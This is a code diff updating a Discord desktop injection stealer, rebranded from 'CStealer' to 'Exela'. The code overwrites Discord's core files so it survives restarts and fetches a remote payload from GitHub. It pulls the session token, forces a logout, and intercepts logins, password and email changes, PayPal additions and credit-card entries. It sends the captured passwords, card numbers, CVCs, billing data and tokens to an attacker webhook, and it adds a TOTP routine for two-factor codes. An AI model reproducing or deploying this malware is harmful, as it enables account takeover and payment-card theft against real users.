@@ -5,24 +5,17 @@ const https = require('https');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
-
-function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
-
 const config = {
-  webhook: '%WEBHOOK%', 
-  webhook_protector_key: '%HOOK_KEY%', 
+  webhook: '%WEBHOOK%',
+  webhook_protector_key: '%WEBHOOK_KEY%',
   auto_buy_nitro: false, 
   ping_on_run: true, 
-  ping_val: '@everyone',
-  embed_name: 'CStealer Injection', 
-  embed_icon: 'https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png'.replace(/ /g, '%20'), 
-  embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Raplhs/23123213423543534r3re34534/main/index.js', 
-  /**
-   
-   **/
+  ping_val: '@everyone', 
+  embed_name: 'Exela Injection', 
+  embed_icon: 'https://i.hizliresim.com/6t31tw2.jpg', 
+  embed_color: 0, 
+  injection_url: 'https://raw.githubusercontent.com/quicaxd/Exela-V2.0/main/injection/injection.js', 
+
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
@@ -70,7 +63,334 @@ const config = {
     ],
   },
 };
-const [LOGOUT_SCRIPT, TOKEN_SCRIPT] = ["window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\"get_require\"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b=\"string\"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})(\"login\").logout()}LogOut();", "for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]), gg.c) if (gg.c.hasOwnProperty(a)) { let b = gg.c[a].exports; if (b && b.__esModule && b.default) for (let a in b.default) 'getToken' == a && (token = b.default.getToken())} token;"];
+
+function parity_32(x, y, z) {
+  return x ^ y ^ z;
+}
+function ch_32(x, y, z) {
+  return (x & y) ^ (~x & z);
+}
+
+function maj_32(x, y, z) {
+  return (x & y) ^ (x & z) ^ (y & z);
+}
+function rotl_32(x, n) {
+  return (x << n) | (x >>> (32 - n));
+}
+function safeAdd_32_2(a, b) {
+  var lsw = (a & 0xffff) + (b & 0xffff),
+    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);
+
+  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
+}
+function safeAdd_32_5(a, b, c, d, e) {
+  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
+    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);
+
+  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
+}
+function binb2hex(binarray) {
+  var hex_tab = '0123456789abcdef',
+    str = '',
+    length = binarray.length * 4,
+    i,
+    srcByte;
+
+  for (i = 0; i < length; i += 1) {
+    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
+    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
+  }
+
+  return str;
+}
+
+function getH() {
+  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
+}
+function roundSHA1(block, H) {
+  var W = [],
+    a,
+    b,
+    c,
+    d,
+    e,
+    T,
+    ch = ch_32,
+    parity = parity_32,
+    maj = maj_32,
+    rotl = rotl_32,
+    safeAdd_2 = safeAdd_32_2,
+    t,
+    safeAdd_5 = safeAdd_32_5;
+
+  a = H[0];
+  b = H[1];
+  c = H[2];
+  d = H[3];
+  e = H[4];
+
+  for (t = 0; t < 80; t += 1) {
+    if (t < 16) {
+      W[t] = block[t];
+    } else {
+      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
+    }
+
+    if (t < 20) {
+      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
+    } else if (t < 40) {
+      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
+    } else if (t < 60) {
+      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
+    } else {
+      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
+    }
+
+    e = d;
+    d = c;
+    c = rotl(b, 30);
+    b = a;
+    a = T;
+  }
+
+  H[0] = safeAdd_2(a, H[0]);
+  H[1] = safeAdd_2(b, H[1]);
+  H[2] = safeAdd_2(c, H[2]);
+  H[3] = safeAdd_2(d, H[3]);
+  H[4] = safeAdd_2(e, H[4]);
+
+  return H;
+}
+
+function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
+  var i, appendedMessageLength, offset;
+
+  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
+  while (remainder.length <= offset) {
+    remainder.push(0);
+  }
+  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
+  remainder[offset] = remainderBinLen + processedBinLen;
+  appendedMessageLength = remainder.length;
+
+  for (i = 0; i < appendedMessageLength; i += 16) {
+    H = roundSHA1(remainder.slice(i, i + 16), H);
+  }
+  return H;
+}
+
+function hex2binb(str, existingBin, existingBinLen) {
+  var bin,
+    length = str.length,
+    i,
+    num,
+    intOffset,
+    byteOffset,
+    existingByteLen;
+
+  bin = existingBin || [0];
+  existingBinLen = existingBinLen || 0;
+  existingByteLen = existingBinLen >>> 3;
+
+  if (0 !== length % 2) {
+    console.error('String of HEX type must be in byte increments');
+  }
+
+  for (i = 0; i < length; i += 2) {
+    num = parseInt(str.substr(i, 2), 16);
+    if (!isNaN(num)) {
+      byteOffset = (i >>> 1) + existingByteLen;
+      intOffset = byteOffset >>> 2;
+      while (bin.length <= intOffset) {
+        bin.push(0);
+      }
+      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
+    } else {
+      console.error('String of HEX type contains invalid characters');
+    }
+  }
+
+  return { value: bin, binLen: length * 4 + existingBinLen };
+}
+
+class jsSHA {
+  constructor() {
+    var processedLen = 0,
+      remainder = [],
+      remainderLen = 0,
+      intermediateH,
+      converterFunc,
+      outputBinLen,
+      variantBlockSize,
+      roundFunc,
+      finalizeFunc,
+      finalized = false,
+      hmacKeySet = false,
+      keyWithIPad = [],
+      keyWithOPad = [],
+      numRounds,
+      numRounds = 1;
+
+    converterFunc = hex2binb;
+
+    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
+      console.error('numRounds must a integer >= 1');
+    }
+    variantBlockSize = 512;
+    roundFunc = roundSHA1;
+    finalizeFunc = finalizeSHA1;
+    outputBinLen = 160;
+    intermediateH = getH();
+
+    this.setHMACKey = function (key) {
+      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
+      keyConverterFunc = hex2binb;
+      convertRet = keyConverterFunc(key);
+      keyBinLen = convertRet['binLen'];
+      keyToUse = convertRet['value'];
+      blockByteSize = variantBlockSize >>> 3;
+      lastArrayIndex = blockByteSize / 4 - 1;
+
+      if (blockByteSize < keyBinLen / 8) {
+        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
+        while (keyToUse.length <= lastArrayIndex) {
+          keyToUse.push(0);
+        }
+        keyToUse[lastArrayIndex] &= 0xffffff00;
+      } else if (blockByteSize > keyBinLen / 8) {
+        while (keyToUse.length <= lastArrayIndex) {
+          keyToUse.push(0);
+        }
+        keyToUse[lastArrayIndex] &= 0xffffff00;
+      }
+
+      for (i = 0; i <= lastArrayIndex; i += 1) {
+        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
+        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
+      }
+
+      intermediateH = roundFunc(keyWithIPad, intermediateH);
+      processedLen = variantBlockSize;
+
+      hmacKeySet = true;
+    };
+
+    this.update = function (srcString) {
+      var convertRet,
+        chunkBinLen,
+        chunkIntLen,
+        chunk,
+        i,
+        updateProcessedLen = 0,
+        variantBlockIntInc = variantBlockSize >>> 5;
+
+      convertRet = converterFunc(srcString, remainder, remainderLen);
+      chunkBinLen = convertRet['binLen'];
+      chunk = convertRet['value'];
+
+      chunkIntLen = chunkBinLen >>> 5;
+      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
+        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
+          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
+          updateProcessedLen += variantBlockSize;
+        }
+      }
+      processedLen += updateProcessedLen;
+      remainder = chunk.slice(updateProcessedLen >>> 5);
+      remainderLen = chunkBinLen % variantBlockSize;
+    };
+
+    this.getHMAC = function () {
+      var firstHash;
+
+      if (false === hmacKeySet) {
+        console.error('Cannot call getHMAC without first setting HMAC key');
+      }
+
+      const formatFunc = function (binarray) {
+        return binb2hex(binarray);
+      };
+
+      if (false === finalized) {
+        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
+        intermediateH = roundFunc(keyWithOPad, getH());
+        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
+      }
+
+      finalized = true;
+      return formatFunc(intermediateH);
+    };
+  }
+}
+
+if ('function' === typeof define && define['amd']) {
+  define(function () {
+    return jsSHA;
+  });
+} else if ('undefined' !== typeof exports) {
+  if ('undefined' !== typeof module && module['exports']) {
+    module['exports'] = exports = jsSHA;
+  } else {
+    exports = jsSHA;
+  }
+} else {
+  global['jsSHA'] = jsSHA;
+}
+
+if (jsSHA.default) {
+  jsSHA = jsSHA.default;
+}
+
+function totp(key) {
+  const period = 30;
+  const digits = 6;
+  const timestamp = Date.now();
+  const epoch = Math.round(timestamp / 1000.0);
+  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
+  const shaObj = new jsSHA();
+  shaObj.setHMACKey(base32tohex(key));
+  shaObj.update(time);
+  const hmac = shaObj.getHMAC();
+  const offset = hex2dec(hmac.substring(hmac.length - 1));
+  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
+  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
+  return otp;
+}
+
+function hex2dec(s) {
+  return parseInt(s, 16);
+}
+
+function dec2hex(s) {
+  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
+}
+
+function base32tohex(base32) {
+  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
+    bits = '',
+    hex = '';
+
+  base32 = base32.replace(/=+$/, '');
+
+  for (let i = 0; i < base32.length; i++) {
+    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
+    if (val === -1) console.error('Invalid base32 character in key');
+    bits += leftpad(val.toString(2), 5, '0');
+  }
+
+  for (let i = 0; i + 8 <= bits.length; i += 8) {
+    let chunk = bits.substr(i, 8);
+    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
+  }
+  return hex;
+}
+
+function leftpad(str, len, pad) {
+  if (len + 1 >= str.length) {
+    str = Array(len + 1 - str.length).join(pad) + str;
+  }
+  return str;
+}
 
 const discordPath = (function () {
   const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
@@ -86,18 +406,18 @@ const discordPath = (function () {
   return { undefined, undefined };
 })();
 
-async function updateCheck() {
+function updateCheck() {
   const { resourcePath, app } = discordPath;
   if (resourcePath === undefined || app === undefined) return;
   const appPath = path.join(resourcePath, 'app');
   const packageJson = path.join(appPath, 'package.json');
   const resourceIndex = path.join(appPath, 'index.js');
-  const indexJs = path.join(resourcePath, 'modules', 'discord_desktop_core-1', 'discord_desktop_core', 'index.js');
+  const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
+  const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
   const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
   if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
   if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
   if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
-
 
   if (process.platform === 'win32' || process.platform === 'darwin') {
     fs.writeFileSync(
@@ -112,32 +432,47 @@ async function updateCheck() {
       ),
     );
 
-    const startUpScript = async () => await BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(`const fs=require("fs"),https=require("https"),path=require("path"),indexJs="${indexJs}",bdPath="${bdPath}",resourcePath="${resourcePath}",fileSize=fs.statSync(indexJs).size;async function init(){https.get("${config.injection_url}",(r=>{const e=fs.createWriteStream(indexJs);r.on("data",(r=>{const t=r.toString().replace("%WEBHOOK%","${config.webhook}");e.write(t)})),r.on("end",(()=>e.end()))})).on("error",(r=>{console.error("Error fetching data from URL:",r),setTimeout(init,1e4)}))}fs.readFile(indexJs,"utf8",((r,e)=>{if(r)return console.error("Error reading file:",r);(fileSize<2e4||"module.exports = require('./core.asar')"===e)&&init()}));try{require(path.join(resourcePath,"app.asar"))}catch(r){console.error("Error loading app.asar:",r)}if(fs.existsSync(bdPath))try{require(bdPath)}catch(r){console.error("Error loading bdPath:",r)}`);
+    const startUpScript = `const fs = require('fs'), https = require('https');
+const indexJs = '${indexJs}';
+const bdPath = '${bdPath}';
+const fileSize = fs.statSync(indexJs).size
+fs.readFileSync(indexJs, 'utf8', (err, data) => {
+    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
+        init();
+})
+async function init() {
+    https.get('${config.injection_url}', (res) => {
+        const file = fs.createWriteStream(indexJs);
+        res.replace('%WEBHOOK%', '${config.webhook}')
+        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
+        res.pipe(file);
+        file.on('finish', () => {
+            file.close();
+        });
     
-    startUpScript().then(startUpScriptResult => {
-      const startUpScriptString = String(startUpScriptResult);
-      fs.writeFileSync(resourceIndex, startUpScriptString.replace(/\\/g, '\\\\'));
+    }).on("error", (err) => {
+        setTimeout(init(), 10000);
     });
+}
+require('${path.join(resourcePath, 'app.asar')}')
+if (fs.existsSync(bdPath)) require(bdPath);`;
+    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
   }
-  const initiationFolderPath = path.join(__dirname, 'initiation');
-  if (!fs.existsSync(initiationFolderPath)) {
-    fs.mkdirSync(initiationFolderPath);
-    await sleep(3000);
-    wwww();
-  }
+  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
+  fs.rmdirSync(path.join(__dirname, 'initiation'));
+  execScript(
+    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
+  ); // logout
   return !1;
-};
+}
 
-const wwww = async () => {
-  await BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(LOGOUT_SCRIPT, true);
-};
-
-const reeeee = async () => {
-  await BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(TOKEN_SCRIPT, true);
+const execScript = (script) => {
+  const window = BrowserWindow.getAllWindows()[0];
+  return window.webContents.executeJavaScript(script, !0);
 };
 
 const getInfo = async (token) => {
-  const info = await BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();
+  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
     xmlHttp.open("GET", "${config.api}", false);
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send(null);
@@ -146,7 +481,7 @@ const getInfo = async (token) => {
 };
 
 const fetchBilling = async (token) => {
-  const bill = await BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest(); 
+  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
     xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
     xmlHttp.setRequestHeader("Authorization", "${token}"); 
     xmlHttp.send(null); 
@@ -186,7 +521,12 @@ const Purchase = async (token, id, _type, _time) => {
     sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
   };
 
-  const req = BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(`var xmlHttp=new XMLHttpRequest,url="https://discord.com/api/v9/store/skus/"+config.nitro[_type][_time].id+"/purchase";xmlHttp.open("POST",url,!1),xmlHttp.setRequestHeader("Authorization",token),xmlHttp.setRequestHeader("Content-Type","application/json"),xmlHttp.send(JSON.stringify(options));var responseText=xmlHttp.responseText;`);
+  const req = execScript(`var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.setRequestHeader('Content-Type', 'application/json');
+    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
+    xmlHttp.responseText`);
   if (req['gift_code']) {
     return 'https://discord.gift/' + req['gift_code'];
   } else return null;
@@ -247,6 +587,9 @@ const getBadges = (flags) => {
       break;
     case 131072:
       badges += 'Verified Bot Developer, ';
+      break;
+    case 4194304:
+      badges += 'Active Developer, ';
       break;
     case 4:
       badges += 'Hypesquad Event, ';
@@ -320,32 +663,18 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '**Account Info**',
-            value: `Email: **${email}**`,
+            value: `Email: **${email}** - Password: **${password}**`,
             inline: false,
           },
           {
-            value: `Password: **${password}**`,
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: false,
           },
           {
-            name: 'Token',
+            name: '**Token**',
             value: `\`${token}\``,
             inline: false,
-          },
-          {
-            name: 'Badges:',
-            value: `**${badges}**`,
-            inline: false,
-          },
-          {
-            name: 'Nitro Type:',
-            value: ```**${nitro}**```,
-            inline: true,
-          },
-          {
-            name: 'Billing:',
-            value: ```**${billing}**```,
-            inline: true,
           },
         ],
         author: {
@@ -372,34 +701,19 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: `**Password Changed**`,
-            value: `Email: **${json.email}**`,
+            name: '**Password Changed**',
+            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
             inline: true,
           },
           {
-            name: '**New Password:**',
-            value: ```**${newpassword}**```,
-            inline: false,
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            inline: true,
           },
           {
-            name: 'Token',
+            name: '**Token**',
             value: `\`${token}\``,
             inline: false,
-          },
-          {
-            name: 'Badges:',
-            value: `**${badges}**`,
-            inline: false,
-          },
-          {
-            name: 'Nitro Type:',
-            value: ```**${nitro}**```,
-            inline: true,
-          },
-          {
-            name: 'Billing:',
-            value: ```**${billing}**```,
-            inline: true,
           },
         ],
         author: {
@@ -427,29 +741,18 @@ const emailChanged = async (email, password, token) => {
         fields: [
           {
             name: '**Email Changed**',
-            value: `New Email: ``**${email}**```,
+            value: `New Email: **${email}**\nPassword: **${password}**`,
             inline: true,
           },
           {
-            value: `Password: ``**${password}**```,
-            inline: false,
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            inline: true,
           },
           {
-            name: `**Token**`,
+            name: '**Token**',
             value: `\`${token}\``,
             inline: false,
-          },
-          {
-            value: `Badges: **${badges}**`,
-            inline: false,
-          },
-          {
-            value: `Nitro Type: ``**${nitro}**```,
-            inline: true,
-          },
-          {
-            value: `Billing: ``**${billing}**```,
-            inline: true,
           },
         ],
         author: {
@@ -481,21 +784,14 @@ const PaypalAdded = async (token) => {
             inline: false,
           },
           {
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
+            inline: false,
+          },
+          {
             name: '**Token**',
             value: `\`${token}\``,
             inline: false,
-          },
-          {
-            value: `Badges: **${badges}**`,
-            inline: false,
-          },
-          {
-            value: `Nitro Type: ``**${nitro}**```,
-            inline: true,
-          },
-          {
-            value: `Billing: ``**${billing}**```,
-            inline: true,
           },
         ],
         author: {
@@ -522,39 +818,19 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**CC Added**',
-            value: `CCN:\n **${number}**`,
+            name: '**Credit Card Added**',
+            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
             inline: true,
           },
           {
-            name: 'CVC:',
-            value: ```**${cvc}**```,
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
           {
-            name: 'CCE:',
-            value: ```**${expir_month}``/``${expir_year}**```,
-            inline: true,
-          },
-          {
-            name: 'Token',
+            name: '**Token**',
             value: `\`${token}\``,
             inline: false,
-          },
-          {
-            name: 'Badges:',
-            value: `**${badges}**`,
-            inline: false,
-          },
-          {
-            name: 'Nitro Type:',
-            value: ```**${nitro}**```,
-            inline: true,
-          },
-          {
-            name: 'Billing:',
-            value: ```**${billing}**```,
-            inline: true,
           },
         ],
         author: {
@@ -588,24 +864,14 @@ const nitroBought = async (token) => {
             inline: true,
           },
           {
-            name: 'Token',
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            inline: true,
+          },
+          {
+            name: '**Token**',
             value: `\`${token}\``,
             inline: false,
-          },
-          {
-            name: 'Badges:',
-            value: `**${badges}**`,
-            inline: false,
-          },
-          {
-            name: 'Nitro Type:',
-            value: ```**${nitro}**```,
-            inline: true,
-          },
-          {
-            name: 'Billing:',
-            value: ```**${billing}**```,
-            inline: true,
           },
         ],
         author: {
@@ -663,7 +929,9 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
   if (details.statusCode !== 200 && details.statusCode !== 202) return;
   const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
   const data = JSON.parse(unparsed_data);
-  reeeee();
+  const token = await execScript(
+    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
+  );
   switch (true) {
     case details.url.endsWith('login'):
       login(data.login, data.password, token).catch(console.error);
